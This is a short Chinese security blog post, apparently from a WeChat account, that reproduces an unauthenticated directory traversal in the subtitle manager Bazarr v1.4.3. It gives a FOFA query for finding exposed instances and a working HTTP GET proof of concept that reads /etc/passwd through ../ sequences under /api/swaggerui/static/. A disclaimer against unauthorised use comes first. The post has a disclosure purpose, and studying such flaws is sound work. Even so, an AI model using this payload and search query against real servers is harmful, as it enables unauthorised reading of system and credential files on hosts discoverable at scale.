#  漏洞复现 || Bazaar swaggerui目录遍历   
韩文庚  我爱林   2024-09-01 07:07  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
‍  
‍  
‍  
‍  
  
Bazarr是 Sonarr 和 Radarr 的一款配套应用程序，可根据用户要求管理和下载字幕，  
‍Bazarr v1.4.3版本发现安全漏洞，该漏洞源于允许未经身份验证的攻击者进行目录遍历。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlPmfEr5PH9c9YIA9umXOFxXPeF2ib51u5nQwSJiawJwAGr8E6jjic7CAPmRQkxnLSRsicWicoiaT2qAJp2A/640?wx_fmt=png&from=appmsg "")  
  
  
## 资产确定  
```
fofa： title="Bazarr"
```  
## 漏洞复现  
  
1.利用如下PO  
C读取  
/etc/passwd  
```
GET /api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlPmfEr5PH9c9YIA9umXOFxXjdc1cE8JAuTa1NWrEWNMJbcPcXHHYIrG9uicZmApiayO7Nw5he2atocA/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
  
  
